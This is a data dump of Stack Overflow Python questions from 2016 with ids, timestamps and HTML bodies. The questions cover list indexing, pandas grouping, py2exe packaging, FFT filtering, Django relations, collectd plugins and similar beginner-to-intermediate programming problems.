39732608,990434.0,2016-09-27 19:14:46+00:00,3,Can't a list have symbols in it?,"<p>I have not done python before (only javascript). I am finding the docs alien and the other stackoverflow posts on <code>list.pop()</code> even more cryptic!</p>

<p>my args are <code>'0','0','0','0','0000'</code></p>

<p>here's my code:</p>

<pre><code>i=['.','.','.',':','']

host=''
for v in sys.argv[1:]:
    host=host+str(v)+str(i.pop())
host=host[:-1]

print host
</code></pre>

<p>I'm trying to get <code>'0.0.0.0:0000'</code></p>

<p>But instead I get: <code>IndexError: pop from empty list</code></p>

<p><a href=""https://repl.it/DirH/1"" rel=""nofollow"">https://repl.it/DirH/1</a></p>

<p>The reason I ask is that I can't find any SO questions where the list is symbols <strong>and</strong> the list is declared in plain writing!</p>
"
39989777,1082673.0,2016-10-12 02:52:13+00:00,3,Sort and group a list of dictionaries,"<p>How can I sort and group this list of dictionaries into a nested dictionary which I want to return via an API as JSON.</p>

<p>Source Data (list of permissions):</p>

<pre><code>[{
    'can_create': True,
    'can_read': True,
    'module_name': 'ModuleOne',
    'module_id': 1,
    'role_id': 1,
    'end_point_id': 1,
    'can_update': True,
    'end_point_name': 'entity',
    'can_delete': True,
}, {
    'can_create': True,
    'can_read': True,
    'module_name': 'ModuleTwo',
    'module_id': 2,
    'role_id': 1,
    'end_point_id': 4,
    'can_update': True,
    'end_point_name': 'financial-outlay',
    'can_delete': True,
},{
    'can_create': True,
    'can_read': True,
    'module_name': 'ModuleOne',
    'module_id': 1,
    'role_id': 1,
    'end_point_id': 2,
    'can_update': True,
    'end_point_name': 'management-type',
    'can_delete': True,
}, {
    'can_create': True,
    'can_read': True,
    'module_name': 'ModuleOne',
    'module_id': 1,
    'role_id': 1,
    'end_point_id': 3,
    'can_update': True,
    'end_point_name': 'ownership-type',
    'can_delete': False,
}, {
    'can_create': True,
    'can_read': True,
    'module_name': 'ModuleTwo',
    'module_id': 2,
    'role_id': 1,
    'end_point_id': 5,
    'can_update': True,
    'end_point_name': 'exposure',
    'can_delete': True,
}]
</code></pre>

<p>I want to transform that into a nested dicitonary object for return with an API as JSON. Here's the expected output:</p>

<pre><code>{
    ""role_id"": 1,
    ""modules"": [{
            ""module_id"": 1,
            ""module_name"": ""ModuleOne"",
            ""permissions"": [{
                ""end_point_id"": 1,
                ""end_point_name"": ""entity"",
                ""can_create"": False,
                ""can_read"": True,
                ""can_write"": True,
                ""can_delete"": True
            }, {
                ""end_point_id"": 2,
                ""end_point_name"": ""management-type"",
                ""can_create"": False,
                ""can_read"": True,
                ""can_write"": True,
                ""can_delete"": True
            }, {
                ""end_point_id"": 3,
                ""end_point_name"": ""ownership-type"",
                ""can_create"": False,
                ""can_read"": True,
                ""can_write"": True,
                ""can_delete"": True
            }, ]
        }, {
            ""module_id"": 2,
            ""module_name"": ""ModuleTwo"",
            ""permissions"": [{
                ""end_point_id"": 4,
                ""end_point_name"": ""financial-outlay"",
                ""can_create"": False,
                ""can_read"": True,
                ""can_write"": True,
                ""can_delete"": True
            }, {
                ""end_point_id"": 5,
                ""end_point_name"": ""exposure"",
                ""can_create"": False,
                ""can_read"": True,
                ""can_write"": True,
                ""can_delete"": True
            }, ]
        },

    ]
}
</code></pre>

<p>It looked trivial until I spent more time that I would expect trying to bend my mind around it. I've attempted so many options with non of them working. Here's the last attempt.</p>

<pre><code># Get user role
user_roles = get_user_roles()  # List of roles e.g. [{'role_id':1, role_name: 'role_one'}, {'role_id':2, role_name: 'role_two'}]

for role in user_roles:
    role_id = role['role_id']
    role_name = role['role_name']

    # Fetch Role Permissions
    role_permissions = get_role_permissions(role_id)  # List of permissions as seen above
    sorted_role_permissions = sorted(role_permissions, key=itemgetter('module_id'))  # sort dictionaries in list by 'module_id'

    modules_list = []
    permissions_list = []
    previous_module_id = 0
    is_first_loop = True
    for role_permission in sorted_role_permissions:

        module_id = role_permission['module_id']
        module_name = role_permission['module_name']
        end_point_id = role_permission['end_point_id']
        end_point_name = role_permission['end_point_name']

        if is_first_loop:
            print(0)
            is_first_loop = False
            previous_module_id = module_id
            print('end_point_name 0 {}'.format(end_point_name))
            permissions = {'end_point_id': end_point_id, 'end_point_name': end_point_name,
                           'can_create': role_permission['can_create'],
                           'can_read': role_permission['can_read'],
                           'can_update': role_permission['can_update'],
                           'can_delete': role_permission['can_delete']
                           }
            permissions_list.append(permissions)
            if len(sorted_role_permissions) == 1:
                # If there is only one permission in the role, end the loop
                modules_dict = {'module_id': module_id, 'module_name': module_name,
                                'permissions': permissions_list}
                modules_list.append(modules_dict)
                break

        else:

            if module_id == previous_module_id:
                # As long as the current module_id and the previous_module_id are the same, add to the same list

                print(1)
                permissions = {'end_point_id': end_point_id, 'end_point_name': end_point_name,
                               'can_create': role_permission['can_create'],
                               'can_read': role_permission['can_read'],
                               'can_update': role_permission['can_update'],
                               'can_delete': role_permission['can_delete']
                               }
                permissions_list.append(permissions)

            else:

                print(2)
                modules_dict = {'module_id': module_id, 'module_name': module_name,
                                'permissions': permissions_list}
                modules_list.append(modules_dict)
                permissions_list = []
                permissions = {'end_point_id': end_point_id, 'end_point_name': end_point_name,
                               'can_create': role_permission['can_create'],
                               'can_read': role_permission['can_read'],
                               'can_update': role_permission['can_update'],
                               'can_delete': role_permission['can_delete']
                               }
                permissions_list.append(permissions)
                previous_module_id = module_id

    if modules_list:
        roles.append({'role_id': role_id, 'role_name': role_name, 'modules': modules_list})
</code></pre>
"
39721639,3337426.0,2016-09-27 09:56:27+00:00,3,"Type not found: '(schema, http://www.w3.org/2001/XMLSchema, )","<p>I am using suds-client for soap wsdl services. When i try to setup the suds client for soap service, I get the Type not found error. I search everywhere. There are many unanswered questions with the same error. I am adding the links as <a href=""http://stackoverflow.com/questions/33611461/typenotfound-type-not-found-schema-http-www-w3-org-2001-xmlschema"">Question1</a>, <a href=""http://stackoverflow.com/questions/25619104/suds-typenotfound-type-not-found-http-www-w3-org-2001-xmlschema"">Question2</a>, <a href=""http://stackoverflow.com/questions/12877583/suds-raise-typenotfoundquery-ref-suds-typenotfound-type-not-found-array-h"">Question3</a></p>

<p>Here is my code </p>

<pre><code>from suds.client import Client
wsdlfile = 'http://track.tcs.com.pk/trackingaccount/track.asmx?WSDL'
track_client = Client(TCS_TRACK_URI)
</code></pre>

<p>On the last line,  I got this error </p>

<pre><code>Traceback (most recent call last):
File ""&lt;console&gt;"", line 1, in &lt;module&gt;
File ""/home/adil/Code/mezino/RoyalTag/royal_tag_services/sms_service/tcs_api.py"", line 24, in &lt;module&gt;
track_client = Client(TCS_TRACK_URI)
File ""/home/adil/Code/mezino/RoyalTag/royalenv/local/lib/python2.7/site-packages/suds/client.py"", line 112, in __init__
self.wsdl = reader.open(url)
File ""/home/adil/Code/mezino/RoyalTag/royalenv/local/lib/python2.7/site-packages/suds/reader.py"", line 152, in open
d = self.fn(url, self.options)
File ""/home/adil/Code/mezino/RoyalTag/royalenv/local/lib/python2.7/site-packages/suds/wsdl.py"", line 159, in __init__
self.build_schema()
File ""/home/adil/Code/mezino/RoyalTag/royalenv/local/lib/python2.7/site-packages/suds/wsdl.py"", line 220, in build_schema
self.schema = container.load(self.options)
File ""/home/adil/Code/mezino/RoyalTag/royalenv/local/lib/python2.7/site-packages/suds/xsd/schema.py"", line 95, in load
child.dereference()
File ""/home/adil/Code/mezino/RoyalTag/royalenv/local/lib/python2.7/site-packages/suds/xsd/schema.py"", line 323, in dereference
midx, deps = x.dependencies()
File ""/home/adil/Code/mezino/RoyalTag/royalenv/local/lib/python2.7/site-packages/suds/xsd/sxbasic.py"", line 422, in dependencies
raise TypeNotFound(self.ref)
TypeNotFound: Type not found: '(schema, http://www.w3.org/2001/XMLSchema, )'
</code></pre>

<p>Please help me find a solution ?</p>
"
40046167,5846481.0,2016-10-14 14:53:59+00:00,3,How do I run pycharm within my docker container?,"<p>I'm very new to docker.  I want to build my python application within a docker container. As I build the application I want to be testing / running it in Pycharm and in the container I build.  </p>

<p>How do I connect Pycharm pro to a specific container or image (either python or Anaconda)?</p>

<p>When I create a project, click pure python and then add remote, then clicking docker I get the following result</p>

<p><a href=""https://i.stack.imgur.com/SVwEE.jpg"" rel=""nofollow""><img src=""https://i.stack.imgur.com/SVwEE.jpg"" alt=""enter image description here""></a></p>

<p>I'm running on Mac OS X El Capitan (10.11.6) with Docker version 1.12.1 and Pycharm Pro 2016.2.3 </p>
"
39996814,6908209.0,2016-10-12 10:54:41+00:00,3,Generate random numbers in range from INPUT (python),"<p>This is a question close to some others I have found but they don't help me so I'm asking specifically for me and my purpose this time. </p>

<p>I'm coding for a bot which is supposed to ask the user for max and min in a range, then generating ten random numbers within that range. When validating I'm told both <code>random</code> and <code>i</code>are unused variables. I don't really get why. I believed <code>random.radint</code>was supposed to be a built in function and as far as <code>i</code> is concerned I really don't know what to believe. This is what I've got so far. </p>

<pre><code>def RandomNumbers():
    """"""
    Asking the user for a min and max, then printing ten random numbers between min and max.
    """"""
    print(""Give me two numbers, a min and a max"")
    a = input(""Select min. "")
    b = input(""Select max. "")


    for i in range(10):
        number = random.randint(a, b)
    print(str(number)+ str("",""), end="""")
</code></pre>

<p>I'll be very happy for every piece of advice I can get to complete my task. Thank you in advance!</p>
"
40016025,6882058.0,2016-10-13 08:33:03+00:00,3,How to make a related field mandatory in Django?,"<p>Suppose I have the following many-to-one relationship in Django:</p>

<pre><code>from django.db import models

class Person(models.Model):
    # ...

class Address(models.Model):
    # ...
    person = models.ForeignKey(Person, on_delete=models.CASCADE)
</code></pre>

<p>This allows a person to have multiple addresses.</p>

<p>I wish to make it mandatory for a person to have at least one address, so it will be impossible to save a person with no addresses in the DB.</p>

<p>How can I achieve this goal? Is it possible to make a related field mandatory (as can be done for ""normal"" fields using <code>blank=False</code>)?</p>
"
39720836,213334.0,2016-09-27 09:20:19+00:00,3,Why is my VotingClassifier accuracy less than my individual classifier?,"<p>I am trying to create an ensemble of three classifiers (Random Forest, Support Vector Machine and XGBoost) using the VotingClassifier() in scikit-learn. However, I find that the accuracy of the ensemble actually decreases instead of increasing. I can't figure out why. </p>

<p>Here is the code:</p>

<pre><code>from sklearn.ensemble import VotingClassifier

eclf = VotingClassifier(estimators=[('rf', rf_optimized), ('svc', svc_optimized), ('xgb', xgb_optimized)], 
                        voting='soft', weights=[1,1,2])

for clf, label in zip([rf, svc_optimized, xgb_optimized, eclf], ['Random Forest', 'Support Vector Machine', 'XGBoost', 'Ensemble']):
    scores = cross_val_score(clf, X, y, cv=10, scoring='accuracy')
    print(""Accuracy: %0.3f (+/- %0.3f) [%s]"" % (scores.mean(), scores.std(), label))
</code></pre>

<p>The XGBoost has the highest accuracy so I even tried giving it more weightage to no avail. </p>

<p>What could I be doing wrong?</p>
"
39989646,6645845.0,2016-10-12 02:37:56+00:00,3,How to generate python exe of a python script including other python scripts,"<p>I am trying to generate an exe for the python script ""cnss_image_loader.py"" which imports other python scripts in the same folder(see below),now I try to generate ""cnss_image_loader.exe"" using command <code>python setup.py py2exe</code>(see output below) and running into below errors,not sure if they are real issue or not but when running the generated exe throws the errors shown below</p>

<p>QUESTION:</p>

<p>1.Can I not use py2exe to generate an executable?</p>

<p>2.<strong><em>Can anyone exactly point to what I am missing and provide guidance to generate the exe?</em></strong></p>

<p>3.Is there a better way to generate a python executable?</p>

<p><strong>ERROR:-</strong></p>

<pre><code>C:\Dropbox\py2exe\dist&gt;cnss_image_loader.exe
Traceback (most recent call last):
  File ""cnss_image_loader.py"", line 9, in &lt;module&gt;
  File ""android_dl.pyc"", line 2, in &lt;module&gt;
  File ""pip\__init__.pyc"", line 14, in &lt;module&gt;
  File ""pip\utils\__init__.pyc"", line 22, in &lt;module&gt;
  File ""pip\compat\__init__.pyc"", line 26, in &lt;module&gt;
ImportError: No module named ipaddr
</code></pre>

<p><strong>Directory structure:-</strong>
<a href=""https://i.stack.imgur.com/wAoxE.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/wAoxE.png"" alt=""py2exe""></a></p>

<p>cnss_image_loader.py</p>

<pre><code>from android_dl import *
from alpaca import *
</code></pre>

<p><strong>setup.py</strong></p>

<pre><code>from distutils.core import setup
import py2exe 
setup(console=['cnss_image_loader.py'])
</code></pre>

<p><strong>python setup.py py2exe</strong></p>

<pre><code>The following modules appear to be missing
['Carbon', 'Carbon.Files', 'ElementC14N', 'OpenSSL.SSL', 'Pyrex.Distutils.build_ext', '_frozen_importlib', '_imp', '_manylinux', '_posixsubprocess', '_scproxy', '_sysconfigdata', 'backports.ssl_match_hostname', 'builtins', 'certifi', 'charade.universaldetector', 'chardet', 'chardet.universaldetector', 'configparser', 'datrie', 'genshi.core', 'html', 'html.entities', 'html.parser', 'http', 'http.client', 'http.cookies', 'importlib.machinery', 'importlib.util', 'ipaddr', 'ipaddress', 'java', 'lxml', 'lxml.etree', 'lzma', 'ndg.httpsclient.ssl_peer_verification', 'ndg.httpsclient.subj_alt_name', 'ordereddict', 'packages.six.moves', 'packages.ssl_match_hostname.CertificateError', 'packages.ssl_match_hostname.match_hostname', 'packages.urllib3.util.Timeout', 'packages.urllib3.util.parse_url', 'pip._vendor.six.moves.urllib', 'pyasn1.codec.der', 'pyasn1.type', 'queue', 'redis', 'reprlib', 'serial', 'serial.tools.list_ports', 'serializer.serialize', 'simplejson', 'sitecustomize', 'socks', 'tree
builders.getTreeBuilder', 'treewalkers.getTreeWalker', 'trie.Trie', 'urllib.error', 'urllib.parse', 'urllib.request', 'urllib3', 'urllib3.packages.backports.makefile', 'usercustomize', 'xmlrpc.client']

*** binary dependencies ***
Your executable(s) also depend on these dlls which are not included,
you may or may not need to distribute them.

Make sure you have the license if you distribute any of them, and
make sure you don't distribute files belonging to the operating system.

   OLEAUT32.dll - C:\WINDOWS\system32\OLEAUT32.dll
   USER32.dll - C:\WINDOWS\system32\USER32.dll
   IMM32.dll - C:\WINDOWS\system32\IMM32.dll
   SHELL32.dll - C:\WINDOWS\system32\SHELL32.dll
   ole32.dll - C:\WINDOWS\system32\ole32.dll
   COMDLG32.dll - C:\WINDOWS\system32\COMDLG32.dll
   COMCTL32.dll - C:\WINDOWS\system32\COMCTL32.dll
   ADVAPI32.dll - C:\WINDOWS\system32\ADVAPI32.dll
   NETAPI32.dll - C:\WINDOWS\system32\NETAPI32.dll
   WS2_32.dll - C:\WINDOWS\system32\WS2_32.dll
   GDI32.dll - C:\WINDOWS\system32\GDI32.dll
   VERSION.dll - C:\WINDOWS\system32\VERSION.dll
   KERNEL32.dll - C:\WINDOWS\system32\KERNEL32.dll
   ntdll.dll - C:\WINDOWS\system32\ntdll.dll
</code></pre>
"
39719729,1305700.0,2016-09-27 08:27:12+00:00,3,How to retrieve a Control Flow Graph for python code?,"<p>I would like to dump the Control Flow Graph of a given python code,
similar to the option given by gcc compiler option: -fdump-tree-cfg for c code.</p>

<p>I succeeded getting the AST (Abstract Syntax Trees) of a python code,
but it seams quite complex and hassle to get the Control Flow Graph from AST phase.</p>

<p>Is there an easier way to retrieve directly the Control Flow Graph of a python code? any suggestions?</p>

<p>oh by the way I'm using python3.5</p>

<p>Thank you all!</p>

<p>P.S
I really don't know what kind of interpreter I'm using under the hood,
As far as I know it's CPython (not sure), I don't think it's PyPy(Rpython). 
Any suggestion how can I verify it?</p>
"
39609426,1479974.0,2016-09-21 06:56:08+00:00,3,Pandas: remove encoding from the string,"<p>I have the following data frame:</p>

<pre><code>  str_value
0 Mock%20the%20Week
1 law
2 euro%202016
</code></pre>

<p>There are many such special characters such as <code>%20%</code>, <code>%2520</code>, etc..How do I remove them all. I have tried the following but the dataframe is large and I am not sure how many such different characters are there.</p>

<pre><code>dfSearch['str_value'] = dfSearch['str_value'].str.replace('%2520', ' ')

dfSearch['str_value'] = dfSearch['str_value'].str.replace('%20', ' ')
</code></pre>
"
39799821,5395658.0,2016-09-30 20:45:59+00:00,3,How to remove frequency from signal,"<p>I want to remove one frequency (one peak) from signal and plot my function without it. After fft I found frequency and amplitude and I am not sure what I need to do now. For example I want to remove my highest peak (marked with red dot on plot).</p>

<pre><code>import numpy as np
import matplotlib.pyplot as plt

# create data
N = 4097
T = 100.0
t = np.linspace(-T/2,T/2,N)
f = np.sin(50.0 * 2.0*np.pi*t) + 0.5*np.sin(80.0 * 2.0*np.pi*t)

#plot function
plt.plot(t,f,'r')
plt.show()

# perform FT and multiply by dt
dt = t[1]-t[0]
ft = np.fft.fft(f) * dt      
freq = np.fft.fftfreq(N, dt)
freq = freq[:N/2+1]
amplitude = np.abs(ft[:N/2+1])
# plot results
plt.plot(freq, amplitude,'o-')
plt.legend(('numpy fft * dt'), loc='upper right')
plt.xlabel('f')
plt.ylabel('amplitude')
#plt.xlim([0, 1.4])


plt.plot(freq[np.argmax(amplitude)], max(amplitude), 'ro')
print ""Amplitude: "" + str(max(amplitude)) + ""  Frequency: "" + str(freq[np.argmax(amplitude)])

plt.show()
</code></pre>
"
39768848,6898276.0,2016-09-29 11:19:44+00:00,3,Collectd - Perl/Python plugin - registration functions not working,"<p>I would like to ask about Collectd's plugins Perl and Python and their registration functions. </p>

<p>I tried to code plugin in Perl (and also in Python), set up read and write functions and after that register them into Collectd (plugin_register functions). In all cases it wasnt working. Everytime, the logs show:</p>

<blockquote>
  <p>Found a configuration for the ""my_plugin"" plugin, but the plugin
  isn't loaded or didn't register a configuration callback.
  severity=warning</p>
</blockquote>

<p>I load my plugin in perl.conf.</p>

<p>Below I attach example of plugin which is directly from Collectd.perl documentation. This plugin, as well as my plugin, has the same result. </p>

<pre><code>package Collectd::Plugins::FooBar;
  use strict;
  use warnings;
  use Collectd qw( :all );

  sub foobar_read
    {
    my $vl = { plugin =&gt; 'foobar', type =&gt; 'gauge' };
    $vl-&gt;{'values'} = [ rand(42) ];
    plugin_dispatch_values ($vl);
    return 1;
    }
  sub foobar_write
    {
    my ($type, $ds, $vl) = @_;
    for (my $i = 0; $i &lt; scalar (@$ds); ++$i) {
      print ""$vl-&gt;{'plugin'} ($vl-&gt;{'type'}): $vl-&gt;{'values'}-&gt;[$i]\n"";
    }
    return 1;
    }

  sub foobar_match
    {
    my ($ds, $vl, $meta, $user_data) = @_;
    if (matches($ds, $vl)) {
      return FC_MATCH_MATCHES;
    } else {
      return FC_MATCH_NO_MATCH;
    }
    }

  plugin_register (TYPE_READ, ""foobar"", ""foobar_read"");
  plugin_register (TYPE_WRITE, ""foobar"", ""foobar_write"");
  fc_register (FC_MATCH, ""foobar"", ""foobar_match"");
</code></pre>
"
39988903,5988911.0,2016-10-12 00:52:28+00:00,3,How to get dataframe index from series?,"<p>Say I extract a series from a dataframe (like what would happen with an apply function). I'm trying to find the original dataframe index from that series.</p>

<pre><code>df=pd.DataFrame({'a':[1,2,3],'b':[4,5,6],'c':[7,8,9]})
x=df.ix[0]
x


Out[109]: 
a    1
b    4
c    7
Name: 0, dtype: int64
</code></pre>

<p>Notice the ""Name: 0"" piece at the bottom of the output. How can I get the value '0' from series object x?</p>
"
39614381,3130747.0,2016-09-21 10:46:03+00:00,3,How to get XKCD font working in matplotlib,"<p><a href=""http://stackoverflow.com/a/22812176/3130747"">I've followed through this post</a>. </p>

<p>I'm trying to reproduce the example <a href=""http://matplotlib.org/xkcd/examples/showcase/xkcd.html"" rel=""nofollow"">from here</a></p>

<p><a href=""http://imgur.com/a/7t6eI"" rel=""nofollow"">This is how mine looks</a></p>

<p><a href=""http://i.stack.imgur.com/IQVxV.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/IQVxV.png"" alt=""enter image description here""></a></p>

<p><a href=""http://imgur.com/a/dEkui"" rel=""nofollow"">This is how it should look</a></p>

<p><a href=""http://i.stack.imgur.com/4lY2k.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/4lY2k.png"" alt=""enter image description here""></a></p>

<p>The code is on that page and at the end of this post</p>

<h1>System that I'm using</h1>

<pre><code>$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.5 LTS
Release:    14.04
Codename:   trusty
</code></pre>

<h1>Python version that I'm using</h1>

<pre><code>3.5.2 |Continuum Analytics, Inc.| (default, Jul  2 2016, 17:53:06) 
[GCC 4.4.7 20120313 (Red Hat 4.4.7-1)]
</code></pre>

<h1>Matplotlib version</h1>

<pre><code>import matplotlib
matplotlib.__version__
Out[37]: '1.5.1'
</code></pre>

<h1>Humorsans font installed on system</h1>

<p>This shows that I have installed the font</p>

<pre><code>$ fc-list | grep ""Humo""
/usr/share/fonts/Humor-Sans-1.0.ttf: Humor Sans:style=Regular
/home/vco/.fonts/Humor-Sans-1.0.ttf: Humor Sans:style=Regular
</code></pre>

<h1>Matplotlib backend that I'm using</h1>

<p><a href=""http://stackoverflow.com/questions/19663986/getting-xkcd-plots-using-matplotlib?noredirect=1&amp;lq=1#comment29202942_19663986"">Here is the back end that I'm using</a></p>

<pre><code>  plt.get_backend()
  Out[42]: 'TkAgg'
</code></pre>

<hr>

<h1>Output error</h1>

<p>I've followed the instructions from a post <a href=""http://stackoverflow.com/a/26148853/3130747"">here</a>;</p>

<p>Error from python output:</p>

<pre><code>/home/vco/anaconda/envs/math_general/lib/python3.5/site-packages/matplotlib/font_manager.py:1288:
UserWarning: findfont: Font family ['Humor Sans', 'Comic Sans MS'] not
found. Falling back to Bitstream Vera Sans

  (prop.get_family(), self.defaultFamily[fontext]))

/home/vco/anaconda/envs/math_general/lib/python3.5/site-packages/matplotlib/font_manager.py:1298:
  UserWarning: findfont: Could not match :family=Bitstream Vera
  Sans:style=normal:variant=normal:weight=400:stretch=normal:size=medium.
  Returning /usr/share/matplotlib/mpl-data/fonts/ttf/cmtt10.ttf UserWarning)
</code></pre>

<p>I also tried to move the downloaded Humorsans font to </p>

<pre><code>/usr/share/matplotlib/mpl-data/fonts/ttf
</code></pre>

<p>But still got the following error</p>

<pre><code>/home/vco/anaconda/envs/math_general/lib/python3.5/site-packages/matplotlib/font_manager.py:1288: UserWarning: findfont: Font family ['Humor Sans', 'Comic Sans MS'] not found. Falling back to Bitstream Vera Sans
  (prop.get_family(), self.defaultFamily[fontext]))
/home/vco/anaconda/envs/math_general/lib/python3.5/site-packages/matplotlib/font_manager.py:1298: UserWarning: findfont: Could not match :family=Bitstream Vera Sans:style=normal:variant=normal:weight=400:stretch=normal:size=medium. Returning /usr/share/matplotlib/mpl-data/fonts/ttf/cmtt10.ttf
  UserWarning)
/home/vco/anaconda/envs/math_general/lib/python3.5/site-packages/matplotlib/font_manager.py:1298: UserWarning: findfont: Could not match :family=Bitstream Vera Sans:style=normal:variant=normal:weight=400:stretch=normal:size=large. Returning /usr/share/matplotlib/mpl-data/fonts/ttf/cmtt10.ttf
  UserWarning)
</code></pre>

<hr>

<h1>code</h1>

<pre><code>from matplotlib import pyplot as plt
import numpy as np

plt.xkcd()

fig = plt.figure()
ax = fig.add_subplot(1, 1, 1)
ax.spines['right'].set_color('none')
ax.spines['top'].set_color('none')
plt.xticks([])
plt.yticks([])
ax.set_ylim([-30, 10])

data = np.ones(100)
data[70:] -= np.arange(30)

plt.annotate(
    'THE DAY I REALIZED\nI COULD COOK BACON\nWHENEVER I WANTED',
    xy=(70, 1), arrowprops=dict(arrowstyle='-&gt;'), xytext=(15, -10))

plt.plot(data)

plt.xlabel('time')
plt.ylabel('my overall health')

fig = plt.figure()
ax = fig.add_subplot(1, 1, 1)
ax.bar([-0.125, 1.0-0.125], [0, 100], 0.25)
ax.spines['right'].set_color('none')
ax.spines['top'].set_color('none')
ax.xaxis.set_ticks_position('bottom')
ax.set_xticks([0, 1])
ax.set_xlim([-0.5, 1.5])
ax.set_ylim([0, 110])
ax.set_xticklabels(['CONFIRMED BY\nEXPERIMENT', 'REFUTED BY\nEXPERIMENT'])
plt.yticks([])

plt.title(""CLAIMS OF SUPERNATURAL POWERS"")

plt.show()
</code></pre>
"
40110540,4110625.0,2016-10-18 14:10:22+00:00,3,Jupyter magic to handle notebook exceptions,"<p>I have a few long-running experiments in my Jupyter Notebooks. Because I don't know when they will finish, I add an email function to the last cell of the notebook, so I automatically get an email, when the notebook is done.</p>

<p>But when there is a random exception in one of the cells, the whole notebook stops executing and I never get any email. <strong>So I'm wondering if there is some magic function that could execute a function in case of an exception / kernel stop.</strong></p>

<p>Like</p>

<pre><code>def handle_exception(stacktrace):
    send_mail_to_myself(stacktrace)


%%in_case_of_notebook_exception handle_exception # &lt;--- this is what I'm looking for
</code></pre>

<p>The other option would be to encapsulate every cell in try-catch, right? But that's soooo tedious.</p>

<p>Thanks in advance for any suggestions.</p>
"
39988621,4525931.0,2016-10-12 00:09:33+00:00,3,Running Fortran executable within Python script,"<p>I am writing a Python script with the following objectives:</p>

<ol>
<li>Starting from current working directory, change directory to child directory 'A'</li>
<li>Make slight adjustments to a fort.4 file</li>
<li>Run a Fortran binary file (the syntax of which is <code>../../../../</code> continuing until I hit the folder containing the binary); return to 2. until my particular objective is complete, then</li>
<li>Back out of child directory to parent, then enter another child directory and return to 2. until I have iterated through all the folders in question.</li>
</ol>

<p>The code is coming along well. I am having to rely heavily upon Python's OS module for the directory work. However, I have never had any experience a) making minor adjustments of a file using python and b) running an executable. Could you guys give me some ideas on Python modules, direct me to a similar stack source etc, or perhaps give ways that this can be accomplished? I understand this is a vague question, so please ask if you do not understand what I am asking and I will elaborate. Also, the changes I have to make to this fort.4 file are repetitive in nature; they all happen at the same position in the file.</p>

<p>Cheers</p>

<p>EDIT::
entire fort.4 file:</p>

<pre><code>file_name           
movie1.dat       !name of a general file the binary reads
nbr_box          ! line3-8 is general info 
2
this_box
1
lrdf_bead
.true.
beadid1
C1               !this is the line I must change
beadid2
F4               !This is a second line I must change
lrdf_com
.false.
bin_width
0.04             
rcut
7                
</code></pre>

<p>So really, I need to change ""C1"" to ""C2"" for example. The changes are very insignificant to make, but I must emphasize the fact that the main fortran executable reads this fort.4, as well as this movie1.dat file that I have already created. Hope this helps</p>
"
39997297,2058355.0,2016-10-12 11:21:01+00:00,3,root user execution fails,"<p>When I run <code>python abc.py</code> it runs fine</p>

<p>But when I do sudo <code>python abc.py</code> then it shows some packages missing error. Of the several import errors, here's the one:</p>

<pre class=""lang-none prettyprint-override""><code>ImportError: No module named numpy
</code></pre>

<p>Why?</p>

<p>What I think is that those packages are installed with normal user(ubuntu) permissions and not root permissions. If this is the case, how should I get over with this? Do I have to install all the packages again with root access?</p>

<p>Note: everything I discussed here is w.r.t ec2 linux ubuntu machine</p>
"
40014390,5244152.0,2016-10-13 07:04:48+00:00,3,Initialize variable depending on another variables type,"<p>In Python 2.7 I want to intialize a variables type depending on another variable.</p>

<p>For example I want to do something like:</p>

<pre><code>var_1 = type(var_2)
</code></pre>

<p>Is there a simple/fast way to do that?</p>
"
40023663,5445395.0,2016-10-13 14:21:31+00:00,3,Python: good way to pass variable to multiple function calls,"<p>Need a help with the next situation. I want to implement debug mode in my script through printing small completion report in functions with command executed name and ellapsed time like:</p>

<pre><code>def cmd_exec(cmd):
    if isDebug:
        commandStart = datetime.datetime.now()
        print commandStart
        print cmd
    ...
    ... exucuting commands
    ...
    if isDebug:
        print datetime.datetime.now() - command_start
    return

def main():
    ...
    if args.debug:
        isDebug = True
    ...
    cmd_exec(cmd1)
    ...
    cmd_exec(cmd2)
    ...
</code></pre>

<p>How can isDebug variable be simply passed to functions?
Should I use ""global isDebug""? </p>

<p>Because </p>

<pre><code>    ...
    cmd_exec(cmd1, isDebug)
    ...
    cmd_exec(cmd2, isDebug)
    ...
</code></pre>

<p>looks pretty bad. Please help me find more elegant way.</p>
"
39801978,192044.0,2016-10-01 00:59:39+00:00,3,Output ascii characters to stdout in Python 3,"<p>I have a file named 'xxx.py' like this:</p>

<pre><code>print(""a simple string"")
</code></pre>

<p>and when I run that like this (Python 3):</p>

<pre><code>python xxx.py &gt;atextfile.txt
</code></pre>

<p>I get a unicode file.</p>

<p>I would like an ascii file.</p>

<p>I don't mind if an exception is thrown if a non-ascii character is attempted to be printed.</p>

<p>What is a simple change I can make to my code that will output ascii characters?</p>

<p>My searches turn up solutions that all seem too verbose for such a simple problem.</p>

<p>[Edit] to report what I learned from setting LC_CTYPE:</p>

<p>I am running on windows 7.</p>

<ol>
<li>When running on the powershell commandline I get a unicode file (two bytes/character)</li>
<li>When running in a .bat file without LC_CTYPE set I get an ascii file (could be utf-8 as @jwodder pointed out).</li>
<li>When running in a .bat file with LC_CTYPE=ascii set I get presumable an ascii file (1 byte/character).</li>
</ol>
"
39733476,6065810.0,2016-09-27 20:10:29+00:00,3,"I am learning Python, need some pushing in the right direction","<p>I am trying to learn Python through Coursera, and have some questions about an assignment.</p>

<blockquote>
  <p>Write a program that prompts for a file name, then opens that file and reads through the file, looking for lines of the form:</p>

<pre><code>X-DSPAM-Confidence:    0.8475
</code></pre>
  
  <p>Count these lines and extract the floating point values from each of the lines and compute the average of those values and produce an output as shown below. Do not use the <code>sum()</code> function or a variable named <code>sum</code> in your solution.</p>
</blockquote>

<p>My code so far is as follows:</p>

<pre><code>fname = raw_input(""Enter file name: "")
f = open(fname)
for line in f:
    if not line.startswith(""X-DSPAM-Confidence:"") : continue
    print line   
print ""Done""
</code></pre>

<p>I am a bit confused. Should I store each line I get into a file or variable or something and then extract the floating point values for each?
How should this be tackled in the simplest way since this is just the beginning of the course?</p>
"
39794016,5426588.0,2016-09-30 14:35:26+00:00,3,pandas: create single size & sum columns after group by multiple columns,"<p>I have a dataframe where I am doing groupby on 3 columns and aggregating the sum and size of the numerical columns. After running the code </p>

<pre><code>df = pd.DataFrame.groupby(['year','cntry', 'state']).agg(['size','sum'])
</code></pre>

<p>I am getting something like below:</p>

<p><a href=""http://i.stack.imgur.com/mZvvz.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/mZvvz.png"" alt=""Image of datafram""></a></p>

